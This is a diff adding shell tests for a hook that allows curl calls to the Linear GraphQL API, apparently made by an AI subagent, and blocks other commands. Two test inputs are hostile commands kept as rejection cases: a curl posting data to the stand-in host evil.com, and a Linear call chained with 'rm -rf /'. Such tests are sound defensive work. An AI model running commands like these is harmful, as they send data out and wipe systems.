@@ -552,6 +552,57 @@ else
 fi
 
 # ==========================================================================
+section "API Allow: curl to Linear API"
+
+# Simple curl
+CMD='curl -s https://api.linear.app/graphql -H "Content-Type: application/json" -d '\''{"query":"{ viewer { id } }"}'\'''
+INPUT=$(hook_input "$CMD" "$REPO_ROOT")
+RESULT=$(run_hook "$API_ALLOW" "$INPUT")
+EXIT_CODE="${RESULT%%|*}"
+OUTPUT="${RESULT#*|}"
+if is_allowed "$OUTPUT"; then
+  pass "curl to Linear API is allowed"
+else
+  fail "curl to Linear API should be allowed" "$OUTPUT"
+fi
+
+# Multiline curl with jq pipe (exact subagent pattern)
+CMD=$(printf 'curl -s https://api.linear.app/graphql \\\n  -H "Authorization: Bearer $KEY" \\\n  -H "Content-Type: application/json" \\\n  -d "{}" | jq "."')
+INPUT=$(hook_input "$CMD" "$REPO_ROOT")
+RESULT=$(run_hook "$API_ALLOW" "$INPUT")
+EXIT_CODE="${RESULT%%|*}"
+OUTPUT="${RESULT#*|}"
+if is_allowed "$OUTPUT"; then
+  pass "multiline curl with jq pipe is allowed"
+else
+  fail "multiline curl with jq pipe should be allowed" "$OUTPUT"
+fi
+
+# curl to non-Linear URL should NOT be allowed
+CMD='curl -s https://evil.com/api -d '\''data'\'''
+INPUT=$(hook_input "$CMD" "$REPO_ROOT")
+RESULT=$(run_hook "$API_ALLOW" "$INPUT")
+EXIT_CODE="${RESULT%%|*}"
+OUTPUT="${RESULT#*|}"
+if ! is_allowed "$OUTPUT"; then
+  pass "curl to non-Linear URL is not allowed"
+else
+  fail "curl to non-Linear URL should not be allowed" "$OUTPUT"
+fi
+
+# curl with chaining operator should NOT be allowed
+CMD='curl -s https://api.linear.app/graphql && rm -rf /'
+INPUT=$(hook_input "$CMD" "$REPO_ROOT")
+RESULT=$(run_hook "$API_ALLOW" "$INPUT")
+EXIT_CODE="${RESULT%%|*}"
+OUTPUT="${RESULT#*|}"
+if ! is_allowed "$OUTPUT"; then
+  pass "curl with chaining is not allowed"
+else
+  fail "curl with chaining should not be allowed" "$OUTPUT"
+fi
+
+# ==========================================================================
 section "API Allow: Multiline Single-Quoted Query"
 
 # This is the exact pattern the subagent generates — GraphQL query spans multiple lines
